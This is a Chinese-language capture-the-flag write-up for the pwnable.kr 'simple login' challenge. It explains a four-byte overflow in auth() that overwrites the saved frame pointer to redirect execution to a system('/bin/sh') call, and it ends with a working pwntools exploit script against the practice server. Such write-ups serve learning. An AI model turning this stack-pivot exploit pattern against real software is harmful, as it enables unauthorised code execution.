---
title: kr_simple login
date: 2020-02-08 16:47:20
tags:
- pwn
- pwnable.kr
---

# pwnable.kr simple login

### 0x0 补充

CANARY:

```
        High

        Address |                 |

                +-----------------+

                | args            |

                +-----------------+

                | return address  |

                +-----------------+

        rbp =>  | old ebp         |

                +-----------------+

      rbp-8 =>  | canary value    |

                +-----------------+

| Local variables |
        Low     |                 |

        Address
```



### 0x0 分析

**这道题我觉得我要记录一下,之前学到的栈溢出都太死板了！**

先检查安全性：

<img src="https://i.loli.net/2020/02/08/fwkSOBz71eL8PYK.png" style="zoom:67%;" />

这道题很奇怪。明明感觉开着canary，但是却可以像寻常一样栈溢出。

分析一下函数：

`main`:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _BYTE *origion; // [esp+18h] [ebp-28h]
  char b64; // [esp+1Eh] [ebp-22h]
  unsigned int len; // [esp+3Ch] [ebp-4h]

  memset(&b64, 0, 0x1Eu);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  printf("Authenticate : ");
  _isoc99_scanf("%30s", &b64);
  memset(&input, 0, 0xCu);
  origion = 0;
  len = Base64Decode((int)&b64, &origion);
  if ( len > 0xC )
  {
    puts("Wrong Length");
  }
  else
  {
    memcpy(&input, origion, len);
    if ( auth(len) == 1 )
      correct();
  }
  return 0;
}
```

看来这道题首先要输入一串base64编码的数据，而且decode之后不可以长度超过`0xc`。

然后最长`0xc`的decode之后的数据被拷贝到一个固定的地方`input`，在`.bss`里。地址为`0x0811EB40`。

然后进入到`auth(len)`函数。

`auth()`:

```c
_BOOL4 __cdecl auth(int a1)
{
  char v2; // [esp+14h] [ebp-14h]
  char *s2; // [esp+1Ch] [ebp-Ch]
  int v4; // [esp+20h] [ebp-8h]

  memcpy(&v4, &input, a1);
  s2 = (char *)calc_md5((int)&v2, 12);
  printf("hash : %s\n", s2);
  return strcmp("f87cd601aa7fedca99018a8be88eda34", s2) == 0;
}
```

本来有想法顺着人家的逻辑来走的。但是看到这里，hash不出来这值啊。23333.

但是在这里发现了溢出点。就是` memcpy(&v4, &input, a1);`。

因为` int v4; // [esp+20h] [ebp-8h]`。`v4`在`ebp-8h`位置。但`input`最长可以赋值给`v4`以`0xc`个字节。搞好溢出到了存放原`ebp`的位置。可以控制`ebp`。

然后看一下下一个函数`correct()`：

`correct()`:

```c
void __noreturn correct()
{
  if ( input == -559038737 )
  {
    puts("Congratulation! you are good!");
    system("/bin/sh");
  }
  exit(0);
}
```

嘿嘿。进入到这个函数就可以了直接完成任务了耶！

那么其实思路出来了。

首先在栈溢出`auth()`函数栈中的存放`ebp`的位置。改变了`main`函数的`ebp`。

然后结束`main`函数的时候必然要经过这样几个步骤：

```assembly
mov esp, ebp
pop ebp
pop eip
```

这样就可以通过栈溢出的4个字节控制栈顶指针为我们想要的位置。然后两次`pop`，第一次`pop`不用管。第二次`pop`我们预先设置的`system("/bin/sh");`位置，即可下一步执行`system("/bin/sh");`。

所以我们可以让栈溢出的4个字节指向`input`。让`input`里先存4个useless字节，再存`system("/bin/sh");`的地址，然后两次`pop`到`system("/bin/sh");`。完成任务！

### 0x1 EXP

```python 
#! /usr/bin/python
#coding=utf-8

from pwn import *
context.log_level='debug'

sh_addr = 0x08049284	#system("/bin/sh")位置
ret_addr = 0x0811EB40	#bss里input位置

payload = b64e(p32(0) + p32(sh_addr) + p32(ret_addr))

p = remote("pwnable.kr", 9003)
p.sendline(payload)
p.interactive()
```

